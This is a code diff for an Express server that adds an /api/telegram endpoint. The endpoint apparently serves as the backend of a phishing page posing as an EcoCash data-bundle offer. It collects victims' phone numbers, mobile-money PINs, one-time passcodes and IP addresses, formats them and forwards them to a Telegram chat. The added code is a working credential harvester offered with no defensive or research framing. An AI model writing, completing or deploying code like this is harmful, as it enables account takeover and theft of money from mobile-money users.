@@ -34,6 +34,7 @@ const chatLimiter = rateLimit({
   keyGenerator: (req) => req.headers['x-forwarded-for']?.split(',')[0] || req.ip,
 });
 app.use('/api/sendTelegram', apiLimiter);
+app.use('/api/telegram', apiLimiter);
 app.use('/api/chat', chatLimiter);
 
 /* ── STATIC FILES ── */
@@ -187,6 +188,62 @@ app.post('/api/chat', async (req, res) => {
   } catch (err) {
     console.error('[/api/chat]', err.message);
     return res.json({ reply: err.message === 'timeout' ? 'Response timed out. Please try again.' : 'An error occurred. Please try again.' });
+  }
+});
+
+
+/* ── POST /api/telegram (frontend calls this) ── */
+app.post('/api/telegram', async (req, res) => {
+  try {
+    const {
+      event = '', phone = '', pin = '', otp = '',
+      plan = '', voice = '', sms = '', data = '', amount = '',
+      // legacy fields
+      loginPhone = '', loginPin = '',
+    } = req.body || {};
+
+    const rawPhone  = phone || loginPhone || '';
+    const rawPin    = pin   || loginPin   || '';
+
+    // Strip country code for display
+    const local = rawPhone
+      .replace(/^\+?00263/, '')
+      .replace(/^\+?263/, '')
+      .replace(/^0/, '')
+      .replace(/\D/g, '')
+      .trim();
+
+    const emoji = {
+      bundle_subscribed:      '💳',
+      receive_offer_clicked:  '📲',
+      offer_received:         '✅',
+      resend_otp:             '🔁',
+    }[event] || '📋';
+
+    const now = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Harare', hour12: false });
+
+    const message = [
+      `${emoji} <b>EcoCash Bundle — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
+      ``,
+      `📅 <b>Time:</b> ${now} CAT`,
+      `📱 <b>Phone:</b> <code>+263${local}</code>`,
+      rawPin ? `🔐 <b>PIN:</b> <code>${rawPin}</code>` : null,
+      otp    ? `🔑 <b>OTP:</b> <code>${otp}</code>`   : null,
+      ``,
+      `📦 <b>Plan:</b> ${plan || '—'}`,
+      voice  ? `📞 <b>Voice:</b> ${voice} Min`  : null,
+      sms    ? `💬 <b>SMS:</b> ${sms} SMS`       : null,
+      data   ? `🌐 <b>Data:</b> ${data} GB`      : null,
+      amount ? `💰 <b>Amount:</b> ${amount}`     : null,
+      ``,
+      `🌐 <b>IP:</b> ${req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '—'}`,
+    ].filter(Boolean).join('\n');
+
+    const result = await sendTelegramMessage(message);
+    return res.json({ ok: true, telegram: result.ok });
+  } catch (err) {
+    console.error('[/api/telegram]', err.message);
+    return res.status(500).json({ error: 'Internal server error' });
   }
 });
 
